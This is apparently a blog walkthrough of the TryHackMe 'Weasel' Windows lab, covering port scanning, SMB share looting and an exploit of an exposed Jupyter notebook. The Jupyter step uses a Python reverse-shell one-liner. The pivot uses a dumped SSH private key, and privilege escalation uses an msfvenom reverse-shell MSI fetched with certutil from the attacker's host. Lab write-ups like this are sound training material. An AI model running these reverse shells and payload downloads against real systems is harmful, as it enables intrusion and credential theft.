---
title: Weasel (Windows)
description: Enumerate SMB shares, gain foothold by exploiting Jupyter, pivot with SSH key, and escalate priviledge with Runas.
author: Bsar
date: 2024-11-06 00:00:00 +06:00
categories: [TryHackMe]
tags: [Pivoting, SMBClient, Jupyter, Token, RCE, winPEAS, Windows, Enumeration]
image: /assets/img/posts/THM-Weasel/Weasel.png
pin: true
math: true
mermaid: true
---

# Nmap/Rustscan

Takes forever, using rustscan

```bash
./rustscan -a 10.10.88.45 -- -A
PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-20T02:44:50+00:00
|_ssl-date: 2024-10-20T02:44:58+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-18T23:30:56
| Not valid after:  2025-04-19T23:30:56
| MD5:   f6de:e514:e45b:322d:dd06:4e3c:abcd:e0dc
| SHA-1: 10b5:2a25:2be6:fdd1:672c:7d4a:0679:b679:42bb:5adf
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQO8ubCgmHoIFPq43WJ58TnjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwHhcNMjQxMDE4MjMzMDU2WhcNMjUw
| NDE5MjMzMDU2WjAaMRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC5JAaydc2c1ySVn5RiMWYfakWNfKQntPth
| sQe23EANdIStYq8RbkXZ8r8xLMiGkNd3SwBW/3BUOBXy9Zxa0zQgAtefoXHuztr4
| yb6/KS0WaF/RGlDAPYisRCH75V30fSC8cOEOV4MQBkHalbJb/x4OhY8pjyI4Qm+Z
| JgjqgenFustrbygv9F5GKmJnBKAa03J7rpuWeWPyfwe+zOmoBN6ImT7i9ap+6AHi
| xJg4a9nBSE1X7gnUEx9rlyG2BVLnesmNTSVAiwNN8vdzw4bl/IOPpFFfpHmQ5b5F
| WKKp00cPL9/y3CzAq6+pDvYgK711CKhEE4BqOTCww05xTES66F6FAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAZ/1FtsYiJ9SB5ufGyJhPWgba6o8agup5p68sIrBe2XWtuSGvM/CL+zHo
| szCP1tI6s/iolPXsoA/Ac2S+E0jn0Y9WvcJ7PzhnKTBwyD2LZpCmVx55TOK9Mz36
| gFnLVIQscpPvO15bgIiugNXq7cWWuBRziM+p4j8mkOIBvZ5bgCLHkFlOw/uoG2R0
| PILKQU4LbGFJpbw8doLATP+7Fq91FluNNRHYHvPnMo2XdyboS7JB+Ycxl1e7Q/WZ
| NlbvpkgWjKGIRCAlYlPT1dKlgassfHvenriaBQgfssxQPT9PCsw3z1KB7ij1V4/0
| Jv2bUW+OV1nIkh9SlRNGHkxcDou2fQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          syn-ack Tornado httpd 6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-20T02:44:46
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50078/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52898/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60028/udp): CLEAN (Failed to receive data)
|   Check 4 (port 46766/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

# SMBClient

![image1.png](/assets/img/posts/THM-Weasel/image1.png)

```bash
get Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv
get weasel.ipynb
cd misc
get jupyter-token.txt
```

There are many rabbit holes, I got lost in it for a good hour

![image2.png](/assets/img/posts/THM-Weasel/image2.png)

# `http://10.10.88.45:8888/`

![image3.png](/assets/img/posts/THM-Weasel/image3.png)

Jupyter is basically VSCode

### Jupyter token

```bash
0674[Redacted]78a
```

![image4.png](/assets/img/posts/THM-Weasel/image4.png)

Same look files on the SMB

## `http://10.10.88.45:8888/notebooks/weasel.ipynb`

# RCE

**Resource:**

`https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/`

```bash
import socket,os,pty;s=socket.socket();s.connect(("10.13.47.211", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")

```

Paster this script and run it on Jupyter notebook

![image5.png](/assets/img/posts/THM-Weasel/image5.png)

![image6.png](/assets/img/posts/THM-Weasel/image6.png)

```bash
sudo /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
```

![image7.png](/assets/img/posts/THM-Weasel/image7.png)

Won’t work

![image8.png](/assets/img/posts/THM-Weasel/image8.png)

has salt and unable to dehash

back to `/home/dev-datasci`

```bash
ls -la
cat dev-datasci-lowpriv_id_ed25519
```

![image9.png](/assets/img/posts/THM-Weasel/image9.png)

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
...[Redacted]...
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----

#leave a space under the end

```

```bash
chmod 400 sshkey
ssh -i sshkey dev-datasci-lowpriv@10.10.88.45
```

![image10.png](/assets/img/posts/THM-Weasel/image10.png)

![image11.png](/assets/img/posts/THM-Weasel/image11.png)

# Window Initial Enumeration

![image12.png](/assets/img/posts/THM-Weasel/image12.png)

![image13.png](/assets/img/posts/THM-Weasel/image13.png)

![image14.png](/assets/img/posts/THM-Weasel/image14.png)

## Run `winPEASx64.exe`

![image15.png](/assets/img/posts/THM-Weasel/image15.png)

```bash
+----------¦ Looking for AutoLogon credentials                                                              
    Some AutoLogon credentials were found                                                                          
    DefaultDomainName             :  DEV-DATASCI-JUP                                                           
    DefaultUserName               :  dev-datasci-lowpriv                                                       
    DefaultPassword               :  wUq[Redacted]aUn
```

![image16.png](/assets/img/posts/THM-Weasel/image16.png)

No good, back to `winpea`

![image17.png](/assets/img/posts/THM-Weasel/image17.png)

# Window Privilege Escalation

Generate a .msi binary with `msfvevom` then launch a server from our machine.

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.13.47.211 lport=6666 -f msi -o setup.msi

python3 -m http.server
```

### On Window

```bash
certutil -urlcache -f http://10.13.47.211:8000/setup.msi setup.msi

runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\setup.msi

Enter the password: wUq[Redacted]aUn
```

![image18.png](/assets/img/posts/THM-Weasel/image18.png)

```bash
type \Users\dev-datasci-lowpriv\Desktop\user.txt && type \users\administrator\desktop\root.txt && ipconfig && date /t
```

![image.png](/assets/img/posts/THM-Weasel/image.png)
